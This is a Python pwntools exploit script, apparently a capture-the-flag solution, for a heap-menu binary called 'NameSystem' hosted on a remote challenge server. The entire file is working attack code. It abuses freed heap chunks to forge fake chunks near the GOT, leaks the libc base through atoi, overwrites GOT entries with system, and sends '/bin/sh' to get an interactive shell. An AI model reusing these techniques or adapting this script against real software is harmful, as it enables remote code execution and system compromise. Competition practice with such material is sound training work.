from pwn import *
import sys
context.log_level='debug'
debug = 0
file_name = './NameSystem'
libc_name = '/lib/x86_64-linux-gnu/libc.so.6'
ip = 'node3.buuoj.cn'
prot = '29827'
if debug:
    r = process(file_name)
    libc = ELF(libc_name)
else:
    r = remote(ip,int(prot))
    libc = ELF(libc_name)

file = ELF(file_name)

sl = lambda x : r.sendline(x)
sd = lambda x : r.send(x)
sla = lambda x,y : r.sendlineafter(x,y)
rud = lambda x : r.recvuntil(x,drop=True)
ru = lambda x : r.recvuntil(x)
li = lambda name,x : log.info(name+':'+hex(x))
ri = lambda  : r.interactive()


def create(chunk_size,value):
    ru('Your choice :')
    sl('1')
    ru('Name Size:')
    sl(str(chunk_size))
    ru('Name:')
    sl(value)

def delete(index):
    ru('Your choice :')
    sl('3')
    ru('The id you want to delete:')
    sl(str(index))


def debug():
    gdb.attach(r)
    raw_input()

for x in range(17):
    create(0x20,"\x11")

create(0x58,"\x22")
create(0x58,"\x22")
create(0x58,"\x22")
delete(18)
delete(18)
delete(17)
delete(19)
fake_chunk1 = 0x601FFA



for x in range(17):
    delete(0)

for x in range(15):
    create(0x20,"\x22")

create(0x60,"\x33")
create(0x60,"\x33")
create(0x60,"\x33")
delete(18)
delete(18)
delete(17)
delete(19)
fake_chunk2 = 0x60208D

for x in range(15):
    delete(2)

for x in range(13):
    create(0x20,"\x33")

create(0x38,"\x44")
create(0x38,"\x44")
create(0x38,"\x44")
delete(18)
delete(18)
delete(17)
delete(19)
fake_chunk3 = 0x602022


for x in range(13):
    delete(4)

create(0x60,p64(fake_chunk2))
create(0x60,"\xaa")
create(0x60,"\xaa")
atoi_got = file.got['atoi']
create(0x60,'\x00'*3+p64(atoi_got))

create(0x58,p64(fake_chunk1))
create(0x58,"\xaa")
create(0x58,"\xaa")
create(0x58,'a'*14+'\xa0\x06\x40\x00\x00\x00')
delete(0)
libc_base = u64(rud("\n")+"\x00\x00")-libc.symbols['atoi']
li("libc_base",libc_base)

create(0x38,p64(fake_chunk3))
create(0x38,"\xaa")
create(0x38,"\xaa")
printf_addr = libc_base+libc.symbols['printf']
alarm_addr = libc_base+libc.symbols['alarm']
read_addr = libc_base+libc.symbols['read']
system_addr = libc_base+libc.symbols['system']
create(0x38,"\x00"*6+p64(printf_addr)+p64(alarm_addr)+p64(read_addr)+'\x00'*16+p64(system_addr))
sl("/bin/sh")
# debug()
ri()